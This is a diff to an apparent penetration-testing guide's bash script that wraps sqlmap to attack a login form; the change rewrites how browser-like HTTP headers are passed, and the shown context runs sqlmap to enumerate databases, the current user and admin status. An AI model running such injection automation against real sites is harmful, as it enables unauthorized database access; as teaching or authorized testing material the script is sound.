@@ -500,26 +500,17 @@ COOKIES=$(curl -s -I "$URL" \
 # Extract only domain and port
 HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')
 
-# Headers
-HEADERS=(
-  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
-  -H "Accept-Language: en-US,fa-IR;q=0.5"
-  -H "Accept-Encoding: gzip, deflate"
-  -H "Content-Type: application/x-www-form-urlencoded"
-  -H "Origin: $URL"
-  -H "Sec-GPC: 1"
-  -H "Connection: keep-alive"
-  -H "Referer: $LOGIN"
-  -H "Upgrade-Insecure-Requests: 1"
-  -H "Priority: u=0, i"
-)
-
-#  Convert Headers → sqlmap Format
-SQLMAP_HEADERS=""
-for h in "${HEADERS[@]}"; do
-    CLEANED=$(echo "$h" | sed 's/^-H //')
-    SQLMAP_HEADERS="${SQLMAP_HEADERS}${CLEANED}\n"
-done
+# Headers - Define directly in sqlmap format (name: value)
+SQLMAP_HEADERS="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,fa-IR;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Origin: $URL
+Sec-GPC: 1
+Connection: keep-alive
+Referer: $LOGIN
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i"
 
 # Run SQLMAP
 if [[ "$METHOD" == "get" ]]; then
@@ -544,6 +535,7 @@ else
         --not-string="invalid\|incorrect\|failed\|error\|denied" \
         --dbs --banner --current-user --current-db --is-dba
 fi
+
 ```
 
 {% hint style="info" %}
